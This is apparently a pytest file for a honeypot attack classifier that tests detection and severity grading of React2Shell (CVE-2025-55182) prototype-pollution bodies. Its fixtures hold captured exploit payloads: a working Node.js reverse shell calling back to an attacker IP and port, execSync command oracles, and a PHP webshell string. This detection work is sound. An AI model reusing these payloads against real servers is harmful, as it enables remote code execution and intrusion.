"""React2Shell / CVE-2025-55182 gets a verdict, graded by what the payload did.

B4a. The internal REACT2SHELL IOC notes §5: across 14 days the decoys hold **313 request
bodies** carrying the prototype-pollution key and **not one** is labelled `CVE_2025_55182`. Every
such label in the store is Suricata's, and the two sensors without HTTP DPI see the family as
nothing at all. On 2026-11-03 a sender delivered a working `child_process` + `net` reverse shell
to `91.92.40.12:12323` and the row says `(none)`.

Three things this file pins, in the order the sheet's §4 ranks them:

**The header is a footprint, not an exploit.** `Next-Action` appears on 2,721 decoy rows while
only 313 carry the pollution key — the same tooling sends the header across its whole path sweep.
So the header alone is `REACT_SERVER_ACTION` at `low`, and classification of the exploit happens
on the BODY. Otherwise 89% of what we would label RCE is a path probe.

**The pollution pair is the exploit tell.** `$1:__proto__:then` together with
`"status":"resolved_model"` has no benign form: it is the reference that poisons `__proto__.then`
plus the state that makes the action handler resolve it, which is what gets `_response._prefix`
evaluated. Field order is the attacker's, so the rule matches either order.

**What the `_prefix` did decides the severity.** A reverse shell, a spawned command and an
arithmetic oracle are not the same event. §5 of the sheet: "the fleet has seen 313 bodies and
exactly one shell. A verdict that treats them alike is wrong about both."

Two deliberate departures from the sheet's "Recommended" list, both recorded in the plan:

* Its item 4 groups `execSync('echo <marker>')` with the arithmetic oracle at MEDIUM. They are
  not alike: the arithmetic (`206104+true+7358727`) answers "did you evaluate my string" without
  leaving the JS engine, while `execSync('echo …')` spawned `/bin/sh` on the host. The arithmetic
  tell is graded medium; a spawned command keeps the RCE verdict.
* Its item 3 reads "same, AND the `_prefix` contains `child_process`". The Node execution and
  reverse-shell tells are registered as their own rules, not conditioned on the React chain,
  because the same bytes are an RCE wherever they are delivered — and nothing in the registry
  named `child_process` before this. The conjunction is still visible: the event carries the
  CVE row and the RCE row together.
"""

from __future__ import annotations

import json
import time

import pytest

from honeylens.classification.attack_classifier import classify_event_row
from honeylens.classification.mitre_mapping import get_mitre_mapping
from honeylens.classification.scoring import get_severity, get_severity_weight

# ---------------------------------------------------------------------------
# The bodies, from §3 of the sheet
# ---------------------------------------------------------------------------

# Every body shares this skeleton; only `_response._prefix` changes (§3).
_SKELETON = (
    '{{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
    '"value":"{{\\"then\\":\\"$B1337\\"}}",'
    '"_response":{{"_prefix":"{prefix}","_chunks":"$Q2",'
    '"_formData":{{"get":"$1:constructor:constructor"}}}}}}'
)

# §3.1 — interactive reverse shell, 91.92.40.12, 2026-11-03. One 619-byte POST and the
# operator has a shell. The IP and port are the attacker's own, verbatim from the capture.
REVERSE_SHELL_PREFIX = (
    "var n=process.mainModule.require('net'),"
    "c=process.mainModule.require('child_process'),"
    "s=c.spawn('/bin/sh',[]),cl=new n.Socket();"
    "cl.connect(12323,'91.92.40.12',()=>{cl.pipe(s.stdin);"
    "s.stdout.pipe(cl);s.stderr.pipe(cl);});"
)

# §3.2 — oracle with a per-request marker, 92.4.69.31. Runs a command, prints a token.
MARKER_ORACLE_PREFIX = (
    "var res=process.mainModule.require('child_process')"
    ".execSync('echo R2SHELL_c8c5c76289').toString().trim();"
    "throw Object.assign(new Error('NEXT_REDIRECT'),{digest:`${res}`});"
)

# §3.3 A — 34.67.103.140, arithmetic through the shell, base64 so it survives `Location:`.
SHELL_ARITH_PREFIX = "execSync('echo $((41*271)) | base64 -w 0')"

# §3.3 B — the same sender, 636 bytes, no command at all.
REDIRECT_ONLY_PREFIX = (
    "throw Object.assign(new Error('x'),{digest:'NEXT_REDIRECT;push;/safe_check_11111;307;'});"
)

# §3.3 — 45.198.224.85 answers "did you evaluate my string" without spawning anything.
# `true` as an addend is the tell: 206104+true+7358727 = 7564832, a value only JavaScript
# coercion produces.
JS_ARITH_PREFIX = (
    "var r=206104+true+7358727;throw Object.assign(new Error('NEXT_REDIRECT'),{digest:`${r}`});"
)


def _body(prefix: str) -> str:
    return _SKELETON.format(prefix=prefix)


def _decoy_row(
    body: str, *, headers: dict | None = None, port: int = 443, path: str = "/"
) -> list[tuple[str, str, str]]:
    """What a decoy stores: the summary line plus the captured body as `payload`, the parsed
    request in `metadata`, and the headers as a DICT — never as wire-form text."""
    hdrs = {
        "host": "sensor.example",
        "content-type": "multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    }
    hdrs.update(headers or {})
    meta = {
        "method": "POST",
        "path": path,
        "port": port,
        "headers": hdrs,
        "body_sample": body,
        "body_len": len(body),
        "user_agent": hdrs["user-agent"],
    }
    payload = f"POST {path} body_len={len(body)}\n{body}"
    return classify_event_row(payload, "http", meta)


def _raw_row(body: str, *, headers: dict | None = None) -> list[tuple[str, str, str]]:
    """What a packet-capture row stores: one raw HTTP request, headers in wire form."""
    lines = {"Host": "sensor.example", "Content-Length": str(len(body))}
    lines.update(headers or {})
    head = "\r\n".join(f"{k}: {v}" for k, v in lines.items())
    return classify_event_row(f"POST / HTTP/1.1\r\n{head}\r\n\r\n{body}", "http", {"dst_port": 443})


def _types(hits) -> set[str]:
    return {h[0] for h in hits}


def _rules(hits) -> set[str]:
    return {h[1] for h in hits}


def _matched(hits, rule: str) -> str:
    for h in hits:
        if h[1] == rule:
            return h[2]
    raise AssertionError(f"rule {rule} did not fire: {hits}")


# ---------------------------------------------------------------------------
# The header is a footprint
# ---------------------------------------------------------------------------


def test_the_next_action_header_alone_is_a_footprint_not_an_exploit():
    """2,721 decoy rows carry the header, 313 carry the pollution key. A verdict that reads
    the header as exploitation is wrong on 89% of what it labels."""
    hits = _decoy_row("id=1", headers={"next-action": "7f3a9c1b"})

    assert "REACT_SERVER_ACTION" in _types(hits)
    assert "CVE_2025_55182" not in _types(hits)
    assert "RCE" not in _types(hits)


def test_the_footprint_is_scored_low():
    assert get_severity("REACT_SERVER_ACTION", "react_server_action_header") == "low"


def test_the_header_is_seen_in_both_dialects():
    """A decoy stores `metadata.headers` as a dict; a capture row carries wire-form text. The
    same request must come back with the same verdict either way — before this, a dict-valued
    metadata field was skipped outright and no header rule could fire on a decoy row at all."""
    assert "REACT_SERVER_ACTION" in _types(_decoy_row("id=1", headers={"next-action": "x"}))
    assert "REACT_SERVER_ACTION" in _types(_raw_row("id=1", headers={"Next-Action": "x"}))


def test_the_nextjs_request_id_header_is_not_a_verdict_on_its_own():
    """§4 lists it as co-occurring, and 1ccfe77b is reused verbatim by one sender — but every
    Next.js build sends this header, so on its own it says nothing."""
    hits = _decoy_row("id=1", headers={"x-nextjs-request-id": "1ccfe77b"})

    assert "REACT_SERVER_ACTION" not in _types(hits)


# ---------------------------------------------------------------------------
# The pollution pair is the exploit
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "prefix",
    [REVERSE_SHELL_PREFIX, MARKER_ORACLE_PREFIX, SHELL_ARITH_PREFIX, REDIRECT_ONLY_PREFIX],
    ids=["revshell", "marker_oracle", "shell_arith", "redirect_only"],
)
def test_every_captured_body_is_named_for_the_cve(prefix):
    """All four shapes share the skeleton, so all four are the CVE. 313 bodies on the fleet
    carried it and none was labelled."""
    hits = _decoy_row(_body(prefix))

    assert "CVE_2025_55182" in _types(hits)
    assert "react2shell_proto_pollution" in _rules(hits)


def test_the_cve_verdict_is_high():
    assert get_severity("CVE_2025_55182", "react2shell_proto_pollution") == "high"


def test_the_pair_matches_in_either_order():
    """Field order is the attacker's. `status` first is as valid a body as `then` first."""
    reordered = (
        '{"status":"resolved_model","reason":-1,"then":"$1:__proto__:then",'
        '"_response":{"_prefix":"1+1"}}'
    )

    assert "CVE_2025_55182" in _types(_decoy_row(reordered))


def test_the_pollution_key_without_resolved_model_is_not_claimed_as_the_cve():
    """The sheet's item 2 requires both tokens: together they have no benign form, and the
    chain does not resolve without `resolved_model`. Claiming the CVE from half of it would
    be the mistake Phase A was about — a label the evidence does not carry."""
    hits = _decoy_row('{"then":"$1:__proto__:then","reason":-1}')

    assert "CVE_2025_55182" not in _types(hits)


def test_resolved_model_alone_is_not_the_cve():
    hits = _decoy_row('{"status":"resolved_model","value":"ok"}')

    assert "CVE_2025_55182" not in _types(hits)


def test_the_body_is_classified_from_the_capture_not_from_the_header():
    """No `Next-Action` header at all — four of the six senders sent one, but the verdict must
    not depend on it."""
    hits = _decoy_row(_body(SHELL_ARITH_PREFIX))

    assert "CVE_2025_55182" in _types(hits)
    assert "REACT_SERVER_ACTION" not in _types(hits)


# ---------------------------------------------------------------------------
# What the _prefix did decides the severity
# ---------------------------------------------------------------------------


def test_the_reverse_shell_is_named_as_command_execution():
    hits = _decoy_row(_body(REVERSE_SHELL_PREFIX))

    assert "RCE" in _types(hits)
    assert "node_child_process_require" in _rules(hits)


def test_the_reverse_shell_target_is_extracted():
    """`cl.connect(12323,'91.92.40.12')` — the C2 is the sender itself. The pair is what the
    operator needs out of the row, so it travels as the matched text."""
    hits = _decoy_row(_body(REVERSE_SHELL_PREFIX))

    assert "C2" in _types(hits)
    matched = _matched(hits, "node_reverse_shell_connect")
    assert "12323" in matched
    assert "91.92.40.12" in matched


def test_the_reverse_shell_is_critical():
    assert get_severity("C2", "node_reverse_shell_connect") == "critical"
    assert get_severity("RCE", "node_child_process_require") == "critical"


def test_the_reverse_shell_outranks_the_pollution_row():
    """A body that opened a socket back to the operator cannot score the same as one that
    computed 7564832."""
    shell = get_severity_weight(get_severity("C2", "node_reverse_shell_connect"))
    pollution = get_severity_weight(get_severity("CVE_2025_55182", "react2shell_proto_pollution"))
    oracle = get_severity_weight(get_severity("CVE_2025_55182", "react2shell_eval_oracle_arith"))

    assert shell > pollution > oracle


def test_a_spawned_command_is_rce_even_when_it_only_echoes_a_marker():
    """§3.2 runs `execSync('echo R2SHELL_c8c5c76289')`. The command is harmless; spawning
    `/bin/sh` on the host is not, and that is what happened."""
    hits = _decoy_row(_body(MARKER_ORACLE_PREFIX))

    assert "RCE" in _types(hits)
    assert "C2" not in _types(hits)


def test_a_bare_sync_exec_call_is_rce_without_the_require():
    """§3.3's variant A carries `execSync(...)` with no `require` in the captured prefix."""
    hits = _decoy_row(_body(SHELL_ARITH_PREFIX))

    assert "RCE" in _types(hits)
    assert "node_sync_command_exec" in _rules(hits)


def test_the_javascript_arithmetic_oracle_is_graded_down_and_spawns_nothing():
    """206104+true+7358727 = 7564832 — evaluation proven, no process started, nothing written."""
    hits = _decoy_row(_body(JS_ARITH_PREFIX))

    assert "react2shell_eval_oracle_arith" in _rules(hits)
    assert get_severity("CVE_2025_55182", "react2shell_eval_oracle_arith") == "medium"
    assert "RCE" not in _types(hits)
    assert "C2" not in _types(hits)


def test_ordinary_arithmetic_is_not_an_oracle():
    """The tell is the boolean addend, not the presence of a `+`. `1+1` says nothing."""
    hits = _decoy_row(_body("var r=206104+7358727;"))

    assert "react2shell_eval_oracle_arith" not in _rules(hits)


def test_the_body_with_no_command_claims_no_execution():
    """§3.3 variant B throws a crafted digest and runs nothing. It is the CVE and nothing more."""
    hits = _decoy_row(_body(REDIRECT_ONLY_PREFIX))

    assert "CVE_2025_55182" in _types(hits)
    assert "RCE" not in _types(hits)
    assert "C2" not in _types(hits)
    assert "react2shell_eval_oracle_arith" not in _rules(hits)


def test_a_hostname_c2_is_not_claimed_as_an_extracted_pair():
    """The rule promises a literal address and a port. `connect(443,'example.com')` carries
    neither, so it must not produce a row that says it did."""
    hits = _decoy_row(_body("cl.connect(443,'cdn.example.com',()=>{});"))

    assert "node_reverse_shell_connect" not in _rules(hits)


# ---------------------------------------------------------------------------
# Not port-gated, and visible on both ingest paths
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("port", [80, 443, 3000, 8000, 8080, 8443, 9999])
def test_the_family_is_not_port_gated(port):
    """The six senders hit netscaler :443, nginx :8000, honeypotng :8080, sharepoint, ng and
    honeypot-express — the Node bait built for a different CVE (§3.1)."""
    hits = _decoy_row(_body(REVERSE_SHELL_PREFIX), port=port)

    assert "CVE_2025_55182" in _types(hits)
    assert "C2" in _types(hits)


def test_the_capture_path_sees_the_same_exploit():
    """`sensor-c` and `sensor-e` have no HTTP DPI, so a decoy row is all they will ever have; `sensor-a`
    and `sensor-b` have both. Both shapes must agree."""
    body = _body(REVERSE_SHELL_PREFIX)

    assert "CVE_2025_55182" in _types(_raw_row(body))
    assert "CVE_2025_55182" in _types(_decoy_row(body))


def test_a_brotli_request_body_is_seen_in_both_dialects_too():
    """`node2shell_brotli_request_body` was written as a JSON pattern against
    `metadata->>'headers'`, which the classifier never handed it — a dict-valued metadata field
    was skipped, and the wire form never matched the JSON shape. Measured 2026-11-05: the rule
    fired on neither a decoy row nor a capture row. It is the only tell Node2Shell has."""
    assert "NODE2SHELL" in _types(_decoy_row("x=1", headers={"content-encoding": "br"}))
    assert "NODE2SHELL" in _types(_raw_row("x=1", headers={"Content-Encoding": "br"}))


def test_offering_brotli_is_not_sending_it():
    """18,300 rows on sensor-a declare `Accept-Encoding: ...br`. Clients offer it constantly."""
    hits = _decoy_row("x=1", headers={"accept-encoding": "gzip, deflate, br"})

    assert "NODE2SHELL" not in _types(hits)


def test_header_serialisation_does_not_invent_a_request_line():
    """The wire-form block built out of `metadata.headers` is headers only. If it carried a
    synthetic `POST / HTTP/1.1` line, `_extract_http_parts` would start reporting a method and
    a path that no capture contained — the defect B2e fixed in the Kubernetes decoy."""
    hits = _decoy_row("x=1", headers={"next-action": "x"})

    assert _types(hits) == {"REACT_SERVER_ACTION"}


# ---------------------------------------------------------------------------
# A large body cannot split the evidence
# ---------------------------------------------------------------------------


def _padded_body(prefix: str, gap: int) -> str:
    """The skeleton with `gap` bytes of filler between the pollution key and the state that
    makes the handler resolve it."""
    return (
        '{"then":"$1:__proto__:then","padding":"'
        + "A" * gap
        + '","status":"resolved_model","reason":-1,'
        + f'"_response":{{"_prefix":"{prefix}"}}}}'
    )


def test_the_two_halves_of_the_evidence_cannot_be_pushed_into_different_windows():
    """Measured 2026-11-05 on three live rows — a 25,212-byte body on sensor-a's netscaler decoy
    and two around 14,000 on sensor-b — the key sat at offset 85-140 and `resolved_model` past
    8 KB. The head window held one token, the tail window held the other, and neither target
    held both, so the pair never matched. One of those rows was stored `(none)`."""
    hits = _decoy_row(_padded_body(REVERSE_SHELL_PREFIX, 20_000))

    assert "CVE_2025_55182" in _types(hits)


def test_the_reverse_shell_target_survives_the_padding_too():
    """The `_prefix` is at the far end of a 20 KB body: whatever window it lands in, the C2
    pair is the one thing an operator must get out of the row."""
    hits = _decoy_row(_padded_body(REVERSE_SHELL_PREFIX, 20_000))

    assert "91.92.40.12" in _matched(hits, "node_reverse_shell_connect")


def test_padding_does_not_manufacture_a_verdict():
    """The whole-body pass runs the same rules, not looser ones."""
    hits = _decoy_row('{"padding":"' + "A" * 20_000 + '","status":"resolved_model"}')

    assert "CVE_2025_55182" not in _types(hits)


def test_the_php2shell_whole_body_pass_still_works_on_a_padded_body():
    """It shares the mechanism this change extended, and its own blind middle cost a
    22,619-byte dropper its verdict once already."""
    body = "PHP_SESSION_UPLOAD_PROGRESS=x" + "A" * 20_000 + "<?php system($_GET[0]);?>"

    assert "CVE_2026_109619" in _types(_decoy_row(body))


# ---------------------------------------------------------------------------
# The attacker does not get to choose how long we spend
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "filler",
    [
        "$1:__proto__:then,",
        "206104+true+",
        "resolved_model,",
        "A",
    ],
    ids=["proto_key", "arithmetic", "resolved_model", "padding"],
)
def test_a_body_of_repeated_tokens_cannot_hold_the_classifier(filler):
    r"""A conjunction expressed as a lookahead restarts a scan at every occurrence of its
    anchor, so a body made of nothing but that anchor is quadratic in the attacker's own
    input. Measured 2026-11-05 with the first draft's unbounded `[\s\S]*`: 11.5 s for ONE
    64 KB body in the oracle rule and 2.0 s in the pollution rule, per event, on the live
    ingest path. With the lookahead bounded and the whole-body decision moved to string
    search, the same bodies classify in 0.24-0.29 s.

    The bound here is deliberately twenty times the measured cost: a wall-clock assertion
    that sits near the real value fails on a busy machine, which is the defect already
    recorded against `_redos_cost` in `analysis/rule_validator`. This test is here to catch a
    return to seconds, not to measure milliseconds."""
    body = (filler * (65536 // len(filler) + 1))[:65536]
    meta = {"method": "POST", "path": "/", "port": 443, "body_sample": body, "body_len": len(body)}

    started = time.perf_counter()
    classify_event_row(f"POST / body_len={len(body)}", "http", meta)
    elapsed = time.perf_counter() - started

    assert elapsed < 5.0, f"{elapsed:.2f}s on a 64 KB body of repeated {filler!r}"


def test_the_whole_body_decision_does_no_backtracking():
    """`_react2shell_whole_body` is two string searches plus one pattern with no unbounded
    lookahead and bounded digit runs — so a body of nothing but digits cannot make it
    backtrack, which is what the registry pattern it replaces did."""
    from honeylens.classification.attack_classifier import _react2shell_whole_body

    body = "1" * 65536

    started = time.perf_counter()
    assert _react2shell_whole_body(body) == []
    assert _react2shell_whole_body("$1:__proto__:then" + body + "resolved_model")
    elapsed = time.perf_counter() - started

    assert elapsed < 1.0, f"{elapsed:.2f}s"


# ---------------------------------------------------------------------------
# The dashboard can place every new verdict
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("attack_type", ["REACT_SERVER_ACTION", "CVE_2025_55182", "C2"])
def test_every_new_verdict_is_mitre_mapped(attack_type):
    """An unmapped verdict shows as a blank on the MITRE view, which is how `RECON` spent its
    whole life there."""
    mapping = get_mitre_mapping(attack_type, "")

    assert mapping, f"{attack_type} has no MITRE mapping"
    assert all(m["technique"].startswith("T") for m in mapping), mapping
    assert all(m["tactic"] for m in mapping), mapping


def test_the_header_footprint_maps_to_reconnaissance_not_execution():
    """It is a path sweep's fingerprint. Mapping it to execution would put 2,721 rows under a
    tactic none of them reached."""
    tactics = {m["tactic"] for m in get_mitre_mapping("REACT_SERVER_ACTION", "")}

    assert tactics == {"reconnaissance"}


def test_the_c2_verdict_maps_to_command_and_control():
    tactics = {m["tactic"] for m in get_mitre_mapping("C2", "")}

    assert "command-and-control" in tactics


# ---------------------------------------------------------------------------
# Nothing else moves
# ---------------------------------------------------------------------------


def test_an_ordinary_post_is_still_unclassified():
    assert _decoy_row("page=2&sort=date") == []


def test_a_benign_json_api_call_gets_no_react_verdict():
    body = json.dumps({"status": "ok", "then": "later", "value": 1})

    assert _types(_decoy_row(body)) == set()


def test_the_php2shell_pair_is_untouched():
    """The other CVE pair classified out of a request body — it shares every mechanism this
    task touched."""
    hits = _decoy_row("PHP_SESSION_UPLOAD_PROGRESS=<?php system($_GET[0]);?>")

    assert "CVE_2026_109619" in _types(hits)
